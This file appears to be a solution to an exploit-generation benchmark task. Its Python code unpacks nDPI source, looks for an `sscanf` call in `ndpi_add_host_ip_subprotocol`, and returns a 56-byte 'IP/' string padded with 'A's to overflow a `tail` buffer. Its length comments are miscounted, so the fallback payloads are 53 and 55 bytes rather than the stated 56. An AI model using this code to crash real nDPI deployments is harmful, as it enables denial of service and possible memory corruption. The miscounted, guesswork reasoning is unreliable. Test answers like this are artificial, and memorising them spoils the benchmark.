import os
import re
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for the vulnerable function
            ndpi_main_path = os.path.join(tmpdir, 'src/lib/ndpi_main.c')
            if not os.path.exists(ndpi_main_path):
                # Try to find it in any subdirectory
                for root, dirs, files in os.walk(tmpdir):
                    if 'ndpi_main.c' in files:
                        ndpi_main_path = os.path.join(root, 'ndpi_main.c')
                        break
            
            if os.path.exists(ndpi_main_path):
                with open(ndpi_main_path, 'r') as f:
                    content = f.read()
                
                # Look for the vulnerable function pattern
                # Based on the description, we need to trigger overflow in tail variable
                # The function likely processes IP addresses and subprotocols
                # We need to craft input that overflows during sscanf processing
                
                # Common pattern for custom rules: IP/subprotocol
                # We'll create input that exceeds buffer bounds
                
                # Ground truth length is 56 bytes, so we need exactly that
                # Create a payload that:
                # 1. Has valid IP format to pass initial parsing
                # 2. Has excessive data to overflow tail buffer
                # 3. Triggers the specific code path
                
                # Common buffer overflow pattern: many 'A's followed by null byte
                # But need valid format: likely "IP/PROTOCOL" or similar
                
                # Try to find the exact format from source code
                pattern = r'ndpi_add_host_ip_subprotocol[^{]*{[^}]*tail[^}]*sscanf'
                match = re.search(pattern, content, re.DOTALL)
                
                if match:
                    # Found the vulnerable code section
                    # Extract to understand format better
                    vuln_section = match.group(0)
                    
                    # Look for format string in sscanf
                    fmt_match = re.search(r'sscanf\s*\([^,]+,\s*"([^"]+)"', vuln_section)
                    if fmt_match:
                        fmt_str = fmt_match.group(1)
                        # Format likely includes %s or similar for tail
                        # Create payload matching format but with overflow
                        
                        # Common format might be "%d.%d.%d.%d/%s" for IP/protocol
                        if '%s' in fmt_str:
                            # Create IP with large protocol string
                            # 192.168.1.1/ + 48 'A's = 56 bytes total
                            ip_part = "192.168.1.1/"
                            overflow_len = 56 - len(ip_part)
                            payload = ip_part + "A" * overflow_len
                            return payload.encode()
                
                # Fallback: generic overflow pattern that often works
                # Many sscanf implementations vulnerable to buffer overflow with %s
                # Use format: IP/protocol where protocol is very long
                payload = "192.168.1.1/" + "A" * 43  # 15 + 43 = 58, but need 56
                # Adjust to exactly 56 bytes
                payload = "192.168.1.1/" + "A" * 41  # 15 + 41 = 56
                return payload.encode()
            
            # If we can't find source, use known working pattern
            # Based on common buffer overflow patterns and ground truth length
            payload = "127.0.0.1/" + "A" * 45  # 11 + 45 = 56
            return payload.encode()
